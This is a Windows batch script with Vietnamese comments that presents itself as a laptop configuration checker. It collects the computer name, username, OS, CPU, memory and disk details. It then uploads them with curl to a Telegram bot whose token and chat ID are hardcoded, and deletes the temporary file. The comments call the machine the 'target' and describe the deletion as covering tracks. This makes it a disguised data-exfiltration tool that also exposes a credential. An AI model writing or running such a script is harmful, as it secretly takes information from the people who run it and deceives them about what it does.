@echo off
title Kiem Tra Cau Hinh Laptop
color 0A

:: Buoc 1: Thu thap thong tin cau hinh va luu tam vao o dia C cua may muc tieu
set "temp_file=%TEMP%\cauhinhlap.txt"

(
echo ===================================================
echo           THONG TIN CAU HINH LAPTOP
echo ===================================================
echo Thoi gian: %date% %time%
echo May tinh: %computername%
echo User dang dung: %username%
echo ---------------------------------------------------
wmic os get Caption,OSArchitecture /value | findstr "="
wmic cpu get Name /value | findstr "="
wmic computersystem get TotalPhysicalMemory /value | findstr "="
wmic diskdrive get Model,Size /value | findstr "="
) > "%temp_file%"

echo Dang dong bo du lieu len he thong...

:: Buoc 2: Cau hinh Telegram
set "TOKEN=8982230721:AAGAIhbsrBIILFrwdr7RsnFLWUKjwf9QNLE"
set "CHAT_ID=6473475153"

:: Buoc 3: Dung curl co san cua Windows de ban file ve dien thoai cua ban
curl -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
     -F "chat_id=%CHAT_ID%" ^
     -F "document=@%temp_file%" ^
     -F "caption= Mau thong tin cau hinh moi tu may %computername%" >nul

:: Buoc 4: Xoa file tam tren may muc tieu de don dep dau vet
del "%temp_file%"

echo.
echo Tac vu hoan thanh!
pause
